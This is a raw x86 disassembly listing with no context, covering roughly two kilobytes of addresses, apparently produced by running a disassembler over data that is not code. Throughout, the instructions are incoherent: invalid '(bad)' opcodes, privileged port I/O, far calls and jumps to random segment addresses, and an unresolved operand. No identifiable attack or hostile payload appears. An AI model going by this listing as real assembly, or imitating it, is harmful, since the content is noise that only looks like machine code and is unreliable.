  40e3c8:	neg    BYTE PTR [edi-0x181b3ceb]
  40e3ce:	mov    dl,0x4d
  40e3d0:	les    esp,FWORD PTR [edx+0x1]
  40e3d3:	jo     0x40e392
  40e3d5:	add    ecx,edx
  40e3d7:	sub    dl,ah
  40e3d9:	scas   al,BYTE PTR es:[edi]
  40e3da:	mov    esp,0x534ed308
  40e3df:	xchg   edi,eax
  40e3e0:	hlt    
  40e3e1:	push   ebp
  40e3e2:	jo     0x40e395
  40e3e4:	xor    ebp,eax
  40e3e6:	mov    DWORD PTR [ebp-0x7ae3c63d],ecx
  40e3ec:	pop    ebp
  40e3ed:	xchg   esp,eax
  40e3ee:	test   eax,0xa9b9f12f
  40e3f3:	imul   edx,esi,0x7fff1a7b
  40e3f9:	mov    al,ds:0x52420062
  40e3fe:	sub    dh,BYTE PTR [eax]
  40e400:	cmp    edx,esp
  40e402:	sbb    edi,esp
  40e404:	push   ss
  40e405:	pop    ebp
  40e406:	fistp  QWORD PTR ds:[edx+0x7e]
  40e40a:	sbb    DWORD PTR [edi-0x54],esi
  40e40d:	fcomi  st,st(2)
  40e40f:	inc    ebx
  40e410:	sbb    bl,BYTE PTR [ebx]
  40e412:	and    al,ch
  40e414:	mov    ch,0xc7
  40e416:	call   0xe9f40a54
  40e41b:	mov    al,ds:0xe42bf1ae
  40e420:	xchg   DWORD PTR [ebx],ecx
  40e422:	inc    esp
  40e423:	(bad)  
  40e425:	jb     0x40e479
  40e427:	lods   eax,DWORD PTR ds:[esi]
  40e428:	out    dx,eax
  40e429:	dec    esi
  40e42a:	adc    eax,0x78201806
  40e42f:	jmp    0x8c4b1606
  40e434:	jb     0x40e456
  40e436:	sub    al,0x9c
  40e438:	sbb    ecx,DWORD PTR [edx]
  40e43a:	(bad)  
  40e43b:	(bad)  
  40e43c:	sti    
  40e43d:	cwde   
  40e43e:	(bad)  [ecx-0x5e]
  40e441:	sar    BYTE PTR [edi],1
  40e443:	cs stos BYTE PTR es:[edi],al
  40e445:	sub    ch,BYTE PTR [edx+ebx*8-0x7f696a6c]
  40e44c:	ins    BYTE PTR es:[edi],dx
  40e44d:	push   eax
  40e44e:	xchg   edx,eax
  40e44f:	cmovge eax,DWORD PTR ds:0xfa87d830
  40e456:	cwde   
  40e457:	outs   dx,BYTE PTR ds:[esi]
  40e458:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40e45a:	jns    0x40e4a5
  40e45c:	sbb    ah,0x6e
  40e45f:	fisubr DWORD PTR [edi+0x2a]
  40e462:	xchg   esi,eax
  40e463:	arpl   WORD PTR ds:0x7e6795f1,si
  40e469:	pop    ebp
  40e46a:	jae    0x40e43d
  40e46c:	pop    cx
  40e46e:	mov    DWORD PTR [esi],ecx
  40e470:	sbb    BYTE PTR [eax],ah
  40e472:	mov    ss,WORD PTR [ebp-0x60b5a373]
  40e478:	nop
  40e479:	retf   0xb248
  40e47c:	xor    DWORD PTR ss:[ecx-0x20],ebp
  40e480:	xchg   DWORD PTR ds:0x3304a28f,ecx
  40e486:	xor    eax,0xf3290886
  40e48b:	or     al,0xa2
  40e48d:	mov    eax,0x46a60ee4
  40e492:	jno    0x40e4f5
  40e494:	xchg   ebp,eax
  40e495:	scas   eax,DWORD PTR es:[edi]
  40e496:	inc    ecx
  40e497:	jno    0x40e4cf
  40e499:	xor    eax,0x98f33ae
  40e49e:	mov    dh,0x91
  40e4a0:	add    al,0x67
  40e4a2:	stos   BYTE PTR es:[edi],al
  40e4a3:	aas    
  40e4a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4a5:	hlt    
  40e4a6:	mov    cl,0x7f
  40e4a8:	neg    DWORD PTR [ecx+0x4ce10eb2]
  40e4ae:	sbb    esp,esi
  40e4b0:	ss cli 
  40e4b2:	stos   BYTE PTR es:[edi],al
  40e4b3:	popa   
  40e4b4:	mov    al,ds:0xa08a92a8
  40e4b9:	cmp    al,0x94
  40e4bb:	es (bad) 
  40e4bd:	mov    ch,0xd
  40e4bf:	sbb    ebp,DWORD PTR [ecx+0x34]
  40e4c2:	lods   eax,DWORD PTR ds:[esi]
  40e4c3:	cmp    ah,BYTE PTR [ebx+0x37]
  40e4c6:	and    DWORD PTR [edx-0x52d2f820],ecx
  40e4cc:	into   
  40e4cd:	push   ebx
  40e4ce:	and    BYTE PTR [ebp-0x34171b90],bl
  40e4d4:	cld    
  40e4d5:	push   cs
  40e4d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4d7:	or     BYTE PTR [edx+0x39],bh
  40e4da:	test   eax,0x2ccb2b04
  40e4df:	jmp    0x49485df4
  40e4e4:	je     0x40e470
  40e4e6:	inc    ebp
  40e4e7:	cmp    al,0x9c
  40e4e9:	or     DWORD PTR [esi-0x1fa9a935],0x2e
  40e4f0:	xor    BYTE PTR [edi],ah
  40e4f2:	pop    edi
  40e4f3:	sahf   
  40e4f4:	in     eax,0xb7
  40e4f6:	shl    DWORD PTR [esp+ebx*4-0x16d553b5],cl
  40e4fd:	and    DWORD PTR [ecx*1+0x7f2d58dd],0xd5040739
  40e508:	xor    DWORD PTR [edx+0x48],ebx
  40e50b:	xor    al,0x86
  40e50d:	xchg   ebp,eax
  40e50e:	outs   dx,BYTE PTR ds:[esi]
  40e50f:	std    
  40e510:	cmc    
  40e511:	or     al,0x40
  40e513:	or     al,0xec
  40e515:	push   ecx
  40e516:	sti    
  40e517:	retf   
  40e518:	ins    BYTE PTR es:[edi],dx
  40e519:	sahf   
  40e51a:	sbb    DWORD PTR [eax-0x1],ebp
  40e51d:	sar    DWORD PTR [ecx-0x6ca23b7f],cl
  40e523:	push   es
  40e524:	popa   
  40e525:	out    dx,eax
  40e526:	loope  0x40e4f7
  40e528:	push   ecx
  40e529:	ins    BYTE PTR es:[edi],dx
  40e52a:	sar    DWORD PTR [edi],1
  40e52c:	cs inc eax
  40e52e:	rol    eax,1
  40e530:	sub    eax,0x8c262c7a
  40e535:	ret    0x4ece
  40e538:	in     al,dx
  40e539:	or     DWORD PTR [eax+0x445a1030],edi
  40e53f:	rcr    BYTE PTR [ebp-0x2462ba6e],1
  40e545:	jo     0x40e4f0
  40e547:	mov    BYTE PTR [ecx],dl
  40e549:	sub    DWORD PTR [edx*1-0xfb96aa],ebx
  40e550:	imul   eax,DWORD PTR [edi],0xffffff99
  40e553:	adc    BYTE PTR [esi+eax*4+0x1b08723b],dl
  40e55a:	imul   esi,DWORD PTR [ebx],0x50
  40e55d:	pop    eax
  40e55e:	xchg   esp,eax
  40e55f:	push   esi
  40e560:	(bad)  
  40e561:	xor    al,0x4e
  40e563:	inc    edx
  40e564:	mov    eax,0x887900e3
  40e569:	scas   al,BYTE PTR es:[edi]
  40e56a:	push   0x62f86d57
  40e56f:	pop    es
  40e570:	and    ebp,esi
  40e572:	or     DWORD PTR [ecx],esp
  40e574:	jmp    FWORD PTR [eax-0x27540b26]
  40e57a:	adc    al,0x17
  40e57c:	jg     0x40e588
  40e57e:	into   
  40e57f:	outs   dx,BYTE PTR ds:[esi]
  40e580:	mov    esi,0xbcf7585b
  40e585:	shr    BYTE PTR [esi+0x4b32001a],1
  40e58b:	inc    ebp
  40e58c:	push   es
  40e58d:	mov    eax,0xc90c206d
  40e593:	pop    esi
  40e594:	cld    
  40e595:	out    0x64,eax
  40e597:	pop    edx
  40e598:	les    ebx,FWORD PTR [edx+edx*8+0x72]
  40e59c:	ss or  al,0x4c
  40e59f:	xchg   edi,eax
  40e5a0:	xchg   ebx,eax
  40e5a1:	test   DWORD PTR [ecx-0x273c9551],esp
  40e5a7:	inc    ebp
  40e5a8:	push   ss
  40e5a9:	mov    ah,0xf0
  40e5ab:	aas    
  40e5ac:	pop    edi
  40e5ad:	test   BYTE PTR [edi+0x31],ch
  40e5b0:	mov    ?,WORD PTR [edi+0x3e75e144]
  40e5b6:	fsub   QWORD PTR [edi+0x660a9585]
  40e5bc:	shr    DWORD PTR [esi-0x10],0xcc
  40e5c0:	cli    
  40e5c1:	inc    esi
  40e5c2:	sub    al,0xf
  40e5c4:	lods   al,BYTE PTR ds:[esi]
  40e5c5:	popa   
  40e5c6:	in     eax,0xd3
  40e5c8:	jmp    0x40e645
  40e5ca:	push   ebx
  40e5cb:	fild   DWORD PTR [esi+0x6ba7fb5]
  40e5d1:	sbb    eax,0x47230064
  40e5d6:	mov    ebp,0x797ab1bd
  40e5db:	jl     0x40e5e4
  40e5dd:	test   BYTE PTR [ebx-0x2d],al
  40e5e0:	rol    DWORD PTR ds:0x70662621,0x22
  40e5e7:	push   ebp
  40e5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5e9:	sub    cl,bl
  40e5eb:	jg     0x40e5b7
  40e5ed:	leave  
  40e5ee:	xchg   BYTE PTR [ebx],dl
  40e5f0:	mov    ch,0x10
  40e5f2:	mov    esi,0x30d821c2
  40e5f7:	pop    esp
  40e5f8:	dec    edi
  40e5f9:	xchg   ecx,eax
  40e5fa:	test   BYTE PTR [edi+0x59],0x6e
  40e5fe:	cmp    eax,0x1010b3d5
  40e603:	(bad)  
  40e604:	pushf  
  40e605:	int3   
  40e606:	inc    ebx
  40e607:	push   edx
  40e608:	or     DWORD PTR [eax-0x4febf71c],0xc918f0b5
  40e612:	cmp    bl,BYTE PTR [esi+0x318b20b6]
  40e618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e619:	repz jp 0x40e610
  40e61c:	adc    al,BYTE PTR [edx+eax*8-0x21]
  40e620:	sbb    BYTE PTR ds:0xdd5a1dab,0x18
  40e627:	push   0xffffffdc
  40e629:	mov    bl,0x26
  40e62b:	mov    esp,ecx
  40e62d:	cmp    DWORD PTR [ecx+esi*4],ecx
  40e630:	jl     0x40e64e
  40e632:	loope  0x40e5eb
  40e634:	fdiv   QWORD PTR [ecx-0x7c]
  40e637:	ja     0x40e66f
  40e639:	lods   eax,DWORD PTR ds:[esi]
  40e63a:	pop    es
  40e63b:	ret    0x2605
  40e63e:	dec    edi
  40e63f:	jge    0x40e68d
  40e641:	clc    
  40e642:	lea    ebx,[ecx+0x62d35b33]
  40e648:	sub    bh,BYTE PTR [esi+ebp*2+0x5c]
  40e64c:	dec    ecx
  40e64d:	adc    BYTE PTR es:[esi],0xf8
  40e651:	inc    edx
  40e652:	cs ja  0x40e64c
  40e655:	std    
  40e656:	inc    edi
  40e657:	jecxz  0x40e5fa
  40e659:	nop
  40e65a:	div    DWORD PTR [ebx]
  40e65c:	xor    eax,0x434e7b08
  40e661:	pop    ebp
  40e662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e663:	and    eax,0xe71a4e41
  40e668:	or     al,ah
  40e66a:	aas    
  40e66b:	outs   dx,DWORD PTR ds:[esi]
  40e66c:	xchg   esp,eax
  40e66d:	and    WORD PTR [esp+ecx*2+0x58afb2d4],dx
  40e675:	and    eax,0x110f8038
  40e67a:	fimul  DWORD PTR [edi+edx*1]
  40e67d:	cmp    al,0xf7
  40e67f:	stos   BYTE PTR es:[edi],al
  40e680:	adc    dh,BYTE PTR [ebx+0x2a9292ef]
  40e686:	mov    ecx,0x3542c79d
  40e68b:	outs   dx,DWORD PTR ds:[esi]
  40e68c:	retf   0x4d09
  40e68f:	call   0x8f38:0xbf52688f
  40e696:	xchg   edx,eax
  40e697:	adc    al,0xe7
  40e699:	mov    esp,0xe6151952
  40e69e:	js     0x40e6d0
  40e6a0:	aas    
  40e6a1:	in     al,0x55
  40e6a3:	cmp    DWORD PTR [edi-0x739eb060],esi
  40e6a9:	jns    0x40e6ab
  40e6ab:	stos   DWORD PTR es:[edi],eax
  40e6ac:	ret    
  40e6ad:	call   FWORD PTR [edi+0x5eb8b9c1]
  40e6b3:	cmp    BYTE PTR [edx],bl
  40e6b5:	jne    0x40e6af
  40e6b7:	mov    al,ds:0xcc30f8be
  40e6bc:	push   edi
  40e6bd:	lock cmc 
  40e6bf:	mov    dl,0xb6
  40e6c1:	or     DWORD PTR [esi-0x2d9e9a5f],esi
  40e6c7:	pop    ebx
  40e6c8:	push   0x2a
  40e6ca:	sahf   
  40e6cb:	loop   0x40e660
  40e6cd:	sbb    ebx,DWORD PTR [esi]
  40e6cf:	in     eax,0x89
  40e6d1:	or     DWORD PTR [ebp-0x1e],ebp
  40e6d4:	test   eax,0xf7cdaab2
  40e6d9:	or     DWORD PTR [eax],0xfffffff2
  40e6dc:	mov    ebx,0xf68bd583
  40e6e1:	outs   dx,BYTE PTR fs:[esi]
  40e6e3:	shr    ecx,0x61
  40e6e6:	imul   ecx,DWORD PTR [ecx+ecx*1-0x76],0x3b37d9c8
  40e6ee:	and    bh,BYTE PTR [ebx+ebx*1]
  40e6f1:	fs ins BYTE PTR es:[edi],dx
  40e6f3:	and    cl,dh
  40e6f5:	sub    eax,0xb583e140
  40e6fa:	repz (bad) 
  40e6fc:	std    
  40e6fd:	inc    ebp
  40e6fe:	cs jle 0x40e769
  40e701:	xchg   DWORD PTR [eax+0x2e21a76a],ecx
  40e707:	sub    DWORD PTR [eax-0x1b33be84],ecx
  40e70d:	jnp    0x40e71c
  40e70f:	sbb    al,0x16
  40e711:	jg     0x40e74d
  40e713:	rol    DWORD PTR [edx-0x75b2e4da],1
  40e719:	(bad)  
  40e71a:	lods   al,BYTE PTR ds:[esi]
  40e71b:	stos   DWORD PTR es:[edi],eax
  40e71c:	adc    ebx,DWORD PTR [ebx-0x57]
  40e71f:	cmp    eax,0x796eec74
  40e724:	bound  ebx,QWORD PTR [ecx+0x474dae1a]
  40e72a:	or     BYTE PTR [esi-0x76],bl
  40e72d:	test   eax,0xfec024fe
  40e732:	imul   ecx,DWORD PTR [esi],0x2e97acae
  40e738:	and    eax,0x490712bd
  40e73d:	mov    gs,WORD PTR [eax+ebx*2-0x7e]
  40e741:	ss xor ebp,eax
  40e744:	in     eax,0x57
  40e746:	mov    esp,0x5e340e41
  40e74b:	test   al,0xd2
  40e74d:	xor    BYTE PTR [ebx+ebx*2-0x5fb353db],bh
  40e754:	lock mov ds:0xefa6a14,eax
  40e75a:	dec    edx
  40e75b:	jl     0x40e74d
  40e75d:	stc    
  40e75e:	ffree  st(7)
  40e760:	in     eax,dx
  40e761:	xor    DWORD PTR [edi+0x44648976],ebx
  40e767:	leave  
  40e768:	sbb    edx,edi
  40e76a:	aad    0x3e
  40e76c:	cs pop eax
  40e76e:	jp     0x40e784
  40e770:	popf   
  40e771:	dec    ecx
  40e772:	arpl   WORD PTR [edi],si
  40e774:	mov    BYTE PTR [edx+0x4f],dl
  40e777:	mov    ecx,0x31036faa
  40e77c:	jg     0x40e709
  40e77e:	shr    DWORD PTR [ecx-0x6b],0xfe
  40e782:	jne    0x40e745
  40e784:	call   0x71c4:0x7ce43e1
  40e78b:	push   edx
  40e78c:	pop    ebp
  40e78d:	xor    eax,0xcc6281e9
  40e792:	bound  edx,QWORD PTR [edi-0x17f0b270]
  40e798:	pop    ss
  40e799:	rcr    DWORD PTR [edi+0x69],cl
  40e79c:	arpl   WORD PTR [eax+eax*8],dx
  40e79f:	xchg   esi,eax
  40e7a0:	cwde   
  40e7a1:	mov    al,ds:0xfa845656
  40e7a6:	pop    edi
  40e7a7:	add    DWORD PTR [ebx-0x3dda9a7b],0x2f
  40e7ae:	ret    0x138b
  40e7b1:	not    esp
  40e7b3:	out    dx,eax
  40e7b4:	add    DWORD PTR [esi-0x5e],ebx
  40e7b7:	mov    ebp,DWORD PTR [ecx-0x10]
  40e7ba:	ins    BYTE PTR es:[edi],dx
  40e7bb:	push   eax
  40e7bc:	in     al,0xa2
  40e7be:	add    BYTE PTR [ecx],ah
  40e7c0:	fsubr  DWORD PTR [ebp+eax*8-0x751d631f]
  40e7c7:	(bad)  
  40e7c8:	out    0x95,eax
  40e7ca:	inc    esi
  40e7cb:	mov    ebx,DWORD PTR [eax-0x75]
  40e7ce:	outs   dx,BYTE PTR ds:[esi]
  40e7cf:	bound  esp,QWORD PTR [edx-0x1ca1e5fd]
  40e7d5:	sbb    DWORD PTR [edi-0x1a],esp
  40e7d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7d9:	loopne 0x40e7bc
  40e7db:	jo     0x40e7a8
  40e7dd:	(bad)  
  40e7de:	push   ss
  40e7df:	sahf   
  40e7e0:	jl     0x40e7c5
  40e7e2:	mov    dh,0x68
  40e7e4:	call   0x9331:0xd46e3ee2
  40e7eb:	adc    al,0x3a
  40e7ed:	sbb    ah,dl
  40e7ef:	jno    0x40e858
  40e7f1:	cld    
  40e7f2:	dec    ebx
  40e7f3:	mov    edx,esi
  40e7f5:	fwait
  40e7f6:	xor    dl,BYTE PTR [esi]
  40e7f8:	mov    ebp,DWORD PTR [ebx+0x9]
  40e7fb:	clc    
  40e7fc:	xor    al,0x87
  40e7fe:	(bad)  
  40e7ff:	cli    
  40e800:	fbld   TBYTE PTR [ebp+0xe]
  40e803:	pop    ebp
  40e804:	je     0x40e882
  40e806:	aaa    
  40e807:	out    dx,al
  40e808:	imul   ebp,DWORD PTR [edi+edi*1+0xb],0xbaefc836
  40e810:	pop    esi
  40e811:	and    ebx,DWORD PTR [ecx-0x459b31b1]
  40e817:	cmp    BYTE PTR [ecx+0x613d95db],0x2d
  40e81e:	jne    0x40e817
  40e820:	addr16 adc bh,al
  40e823:	test   al,0x4
  40e825:	loopne 0x40e854
  40e827:	dec    esp
  40e828:	sub    al,0xf8
  40e82a:	cmc    
  40e82b:	pop    edx
  40e82c:	xchg   bh,ah
  40e82e:	mov    ebx,0xb42c25a5
  40e833:	sar    ecx,cl
  40e835:	adc    al,0x9f
  40e837:	fimul  DWORD PTR [ebp*4+0x7a29ba40]
  40e83e:	add    BYTE PTR [esi+0x5b5778c1],dl
  40e844:	mov    dh,0xcd
  40e846:	push   edi
  40e847:	stos   BYTE PTR es:[edi],al
  40e848:	ds push cs
  40e84a:	xchg   esi,eax
  40e84b:	push   0x3b
  40e84d:	retf   
  40e84e:	jae    0x40e8b8
  40e850:	dec    ebx
  40e851:	cdq    
  40e852:	cmp    eax,0xc4e67561
  40e857:	mov    ds:0xa6693406,al
  40e85c:	mov    ds:0x33167b64,eax
  40e861:	shr    DWORD PTR [ecx+0x37c1360c],cl
  40e867:	mov    al,ds:0xbeb76b48
  40e86c:	dec    ecx
  40e86d:	lahf   
  40e86e:	out    dx,eax
  40e86f:	dec    esi
  40e870:	stos   BYTE PTR es:[edi],al
  40e871:	fwait
  40e872:	and    BYTE PTR [ecx],bl
  40e874:	push   ebp
  40e875:	pop    eax
  40e876:	dec    esp
  40e877:	repnz or ecx,DWORD PTR [eax+0x12250d5d]
  40e87e:	jmp    0xd05d:0x2169e1aa
  40e885:	outs   dx,BYTE PTR ds:[esi]
  40e886:	inc    esi
  40e887:	jno    0x40e8e4
  40e889:	inc    esp
  40e88a:	mov    esi,ss
  40e88c:	neg    bl
  40e88e:	stos   BYTE PTR es:[edi],al
  40e88f:	mov    ebp,0xf1cc1e0c
  40e894:	add    dl,al
  40e896:	bound  edi,QWORD PTR [edi-0x106db64f]
  40e89c:	jo     0x40e8c9
  40e89e:	jmp    0xa3cfe42b
  40e8a3:	lea    ebp,[edi-0x3d1258d0]
  40e8a9:	xchg   DWORD PTR [edi+0x3a],edi
  40e8ac:	jb     0x40e879
  40e8ae:	popa   
  40e8af:	and    ch,dl
  40e8b1:	arpl   WORD PTR [edx+0x16],si
  40e8b4:	out    0x39,eax
  40e8b6:	mov    ch,BYTE PTR [ebx]
  40e8b8:	xchg   esi,eax
  40e8b9:	int3   
  40e8ba:	cmovg  ebp,ecx
  40e8bd:	inc    edx
  40e8be:	pushf  
  40e8bf:	aam    0x44
  40e8c1:	call   0x5325:0x8158878
  40e8c8:	add    cl,BYTE PTR [ebp-0xd3e6831]
  40e8ce:	cmp    al,0xa0
  40e8d0:	call   0xe656:0x6f6d3d3c
  40e8d7:	and    ch,BYTE PTR [esi]
  40e8d9:	push   ds
  40e8da:	xor    al,0x56
  40e8dc:	std    
  40e8dd:	popa   
  40e8de:	and    dl,BYTE PTR [ecx+esi*1+0x15]
  40e8e2:	loopne 0x40e865
  40e8e4:	xchg   ebp,esi
  40e8e6:	lds    esp,FWORD PTR [eax]
  40e8e8:	and    DWORD PTR [edi],edx
  40e8ea:	repnz inc ecx
  40e8ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8ed:	cmc    
  40e8ee:	xor    al,0x69
  40e8f0:	dec    edx
  40e8f1:	jne    0x40e921
  40e8f3:	inc    ebp
  40e8f4:	in     eax,0x58
  40e8f6:	adc    dh,dh
  40e8f8:	nop
  40e8f9:	sub    esp,DWORD PTR gs:[ebp-0x59da0eeb]
  40e900:	sub    al,0xe7
  40e902:	rcr    BYTE PTR [ebx],0xfd
  40e905:	dec    ebx
  40e906:	fsub   QWORD PTR [eax+0x15]
  40e909:	dec    edi
  40e90a:	xchg   esi,eax
  40e90b:	push   ss
  40e90c:	pop    ss
  40e90d:	fcmovu st,st(6)
  40e90f:	pop    es
  40e910:	mov    edx,0xf0cc74b1
  40e915:	fld    TBYTE PTR [eax-0x10]
  40e918:	fild   WORD PTR [ebp-0x3e]
  40e91b:	push   0x4b
  40e91d:	sbb    eax,DWORD PTR [esi+ebx*1]
  40e920:	push   ecx
  40e921:	outs   dx,BYTE PTR ds:[esi]
  40e922:	inc    ebx
  40e923:	pop    esp
  40e924:	in     eax,0xe9
  40e926:	inc    eax
  40e927:	int    0x6d
  40e929:	data16 cli 
  40e92b:	ja     0x40e997
  40e92d:	imul   BYTE PTR [ecx]
  40e92f:	pop    ebp
  40e930:	add    edx,DWORD PTR [edx-0x76]
  40e933:	sbb    BYTE PTR [ebx+0x585a253c],dl
  40e939:	push   esp
  40e93a:	mov    DWORD PTR [ecx-0x17],edx
  40e93d:	stos   DWORD PTR es:[edi],eax
  40e93e:	push   0xffffff89
  40e940:	mov    ecx,0x4a0b558f
  40e945:	(bad)  
  40e947:	sub    BYTE PTR [ecx+0x7e0a13e0],dh
  40e94d:	or     al,0xc
  40e94f:	push   esi
  40e950:	retf   
  40e951:	push   eax
  40e952:	bound  ecx,QWORD PTR [ebx+0x1fe5255d]
  40e958:	dec    edx
  40e959:	into   
  40e95a:	jmp    0x40e9c0
  40e95c:	ficomp DWORD PTR ds:0x3ed375e9
  40e962:	push   ecx
  40e963:	sub    eax,0x7a6fa06a
  40e968:	jnp    0x40e8ef
  40e96a:	mov    dh,0x6e
  40e96c:	into   
  40e96d:	sbb    DWORD PTR [ebx],0x12
  40e970:	mov    eax,ebx
  40e972:	stos   DWORD PTR es:[edi],eax
  40e973:	rol    BYTE PTR [ebp-0x2f],1
  40e976:	in     al,0x89
  40e978:	mov    cs,WORD PTR [edx+0x73ec32f2]
  40e97e:	ss inc ebx
  40e980:	add    BYTE PTR [edx-0x6483edcc],0x10
  40e987:	mov    dl,0xe5
  40e989:	outs   dx,BYTE PTR ds:[esi]
  40e98a:	mov    eax,0xa2bbb0cd
  40e98f:	ss jbe 0x40e9f4
  40e992:	jae    0x40e936
  40e994:	daa    
  40e995:	outs   dx,BYTE PTR ds:[esi]
  40e996:	jo     0x40e98b
  40e998:	sub    bh,BYTE PTR [edx+0x1663b3c3]
  40e99e:	fidiv  DWORD PTR [ebp+0x61]
  40e9a1:	cmp    al,0x31
  40e9a3:	popa   
  40e9a4:	lds    edx,FWORD PTR [edi]
  40e9a6:	cmc    
  40e9a7:	leave  
  40e9a8:	dec    ebp
  40e9a9:	out    0xed,eax
  40e9ab:	retf   0x4f4c
  40e9ae:	push   ebx
  40e9af:	(bad)  
  40e9b0:	test   eax,0x7cba81b0
  40e9b5:	outs   dx,BYTE PTR ds:[esi]
  40e9b6:	aad    0xa6
  40e9b8:	mov    cl,0xa8
  40e9ba:	pop    es
  40e9bb:	and    BYTE PTR [ebx],ch
  40e9bd:	cmp    edx,DWORD PTR [edi]
  40e9bf:	cld    
  40e9c0:	rcr    edx,0x6d
  40e9c3:	pop    eax
  40e9c4:	hlt    
  40e9c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9c6:	pop    edx
  40e9c7:	scas   eax,DWORD PTR es:[edi]
  40e9c8:	inc    ebx
  40e9c9:	xor    DWORD PTR [esi],ebx
  40e9cb:	xrelease xchg DWORD PTR [edi-0x67],edx
  40e9cf:	ins    DWORD PTR es:[edi],dx
  40e9d0:	mov    ecx,0x44c9f0ee
  40e9d5:	sub    edi,DWORD PTR [ecx+eiz*2]
  40e9d8:	xchg   DWORD PTR ds:0x80f5dd91,eax
  40e9de:	xchg   ebp,eax
  40e9df:	cmc    
  40e9e0:	loopne 0x40e9c0
  40e9e2:	dec    esp
  40e9e3:	add    ax,0xb90a
  40e9e7:	popa   
  40e9e8:	ret    0xa320
  40e9eb:	adc    al,0x6e
  40e9ed:	arpl   WORD PTR [edi+edi*8-0x76beab90],bp
  40e9f4:	int3   
  40e9f5:	xor    ebp,DWORD PTR [ebp-0x5736e152]
  40e9fb:	in     eax,0x86
  40e9fd:	loopne 0x40e98d
  40e9ff:	fsubr  QWORD PTR [edx-0x39d2a79e]
  40ea05:	(bad)  
  40ea06:	ins    DWORD PTR es:[edi],dx
  40ea07:	repz mov ah,0x9
  40ea0a:	push   eax
  40ea0b:	mov    ds:0x9a23c9e8,eax
  40ea10:	ins    BYTE PTR es:[edi],dx
  40ea11:	xchg   ebx,edi
  40ea13:	or     BYTE PTR [esi],0xe4
  40ea16:	push   cs
  40ea17:	jecxz  0x40ea35
  40ea19:	test   BYTE PTR [esi],ah
  40ea1b:	xchg   edx,eax
  40ea1c:	out    dx,al
  40ea1d:	popf   
  40ea1e:	retf   0xbd67
  40ea21:	sub    al,BYTE PTR ds:0xf94beaab
  40ea27:	out    0xa,eax
  40ea29:	pop    ds
  40ea2a:	mov    eax,ds:0xd9d3efa2
  40ea2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea30:	mov    esi,0x1d935663
  40ea35:	xchg   DWORD PTR [ecx-0x61],ebp
  40ea38:	cmp    eax,0x921986bb
  40ea3d:	cmc    
  40ea3e:	jne    0x40ea87
  40ea40:	mov    ds:0xfe1da9a1,al
  40ea45:	jle    0x40ea18
  40ea47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea48:	push   edi
  40ea49:	pop    ecx
  40ea4a:	mov    esi,0xd3c1edea
  40ea4f:	clc    
  40ea50:	or     DWORD PTR [edx+esi*4],ecx
  40ea53:	sbb    al,0x77
  40ea55:	call   FWORD PTR ss:[edx+0x62]
  40ea59:	push   ss
  40ea5a:	pop    ebp
  40ea5b:	jbe    0x40e9e4
  40ea5d:	rcl    DWORD PTR [ecx+0x181cd3d9],0x66
  40ea64:	mov    cs:0x8c94f4d,eax
  40ea6a:	push   cs
  40ea6b:	lock push ecx
  40ea6d:	repz and BYTE PTR [ebp+ebx*4+0x6983f8f0],bl
  40ea75:	(bad)  
  40ea76:	pop    ecx
  40ea77:	out    0x25,eax
  40ea79:	jle    0x40ea0e
  40ea7b:	adc    al,0xa5
  40ea7d:	add    BYTE PTR [esp+eiz*4],al
  40ea80:	(bad)  
  40ea81:	mov    ds:0x5007f493,eax
  40ea86:	xor    dl,BYTE PTR [esp+ebx*8+0x30]
  40ea8a:	xor    al,0xfe
  40ea8c:	or     al,0xbc
  40ea8e:	xor    DWORD PTR [ecx-0x7d173a2b],0x1a6805ad
  40ea98:	adc    eax,0xcf1e86e7
  40ea9d:	xor    ch,BYTE PTR [eax]
  40ea9f:	xchg   esi,eax
  40eaa0:	dec    ebx
  40eaa1:	cmp    esp,DWORD PTR [ebx]
  40eaa3:	mov    ebx,0x15338204
  40eaa8:	scas   eax,DWORD PTR es:[edi]
  40eaa9:	arpl   bp,di
  40eaab:	mov    ebx,0x6ebd3354
  40eab0:	(bad)  
  40eab1:	ficomp WORD PTR [ebx+0x3ad3331a]
  40eab7:	data16 icebp 
  40eab9:	dec    ecx
  40eaba:	inc    edx
  40eabb:	(bad)  
  40eabc:	push   esp
  40eabd:	jecxz  0x40eaab
  40eabf:	lds    edx,FWORD PTR [ecx]
  40eac1:	or     eax,0xce3b6d8d
  40eac6:	pop    esi
  40eac7:	out    dx,al
  40eac8:	mov    edi,0x1f82f0b
  40eacd:	popa   
  40eace:	nop
  40eacf:	jno    0x40eb31
  40ead1:	sbb    eax,0x393f2ab5
  40ead6:	lahf   
  40ead7:	stos   DWORD PTR es:[edi],eax
  40ead8:	sub    DWORD PTR [ebx],ebp
  40eada:	ret    0x507a
  40eadd:	repz mov ah,0x37
  40eae0:	addr16 jno 0x40eb5f
  40eae3:	jg     0x40eb23
  40eae5:	cmp    DWORD PTR fs:[ebp+ecx*4+0x55ab3afa],0x13da0173
  40eaf1:	bound  ebp,QWORD PTR [esi-0x4e08c6ad]
  40eaf7:	pop    eax
  40eaf8:	xchg   esp,eax
  40eaf9:	das    
  40eafa:	push   esp
  40eafb:	sbb    ebx,DWORD PTR [edx]
  40eafd:	xchg   esp,eax
  40eafe:	gs out 0x7b,eax
  40eb01:	hlt    
  40eb02:	in     al,0x9
  40eb04:	pushf  
  40eb05:	out    0x45,al
  40eb07:	xchg   BYTE PTR [esp+edx*1+0x61a755ba],ah
  40eb0e:	inc    eax
  40eb0f:	sub    DWORD PTR [ebx-0x13],edi
  40eb12:	mov    edi,0x1fbe6362
  40eb17:	and    dl,ah
  40eb19:	mov    al,ds:0x6460966a
  40eb1e:	or     dl,BYTE PTR [edx]
  40eb20:	out    0xfa,al
  40eb22:	pop    edx
  40eb23:	imul   esp,edi,0xfffffff2
  40eb26:	dec    esi
  40eb27:	add    ebx,DWORD PTR [esp+edx*1-0x3b7c7ee4]
  40eb2e:	pop    eax
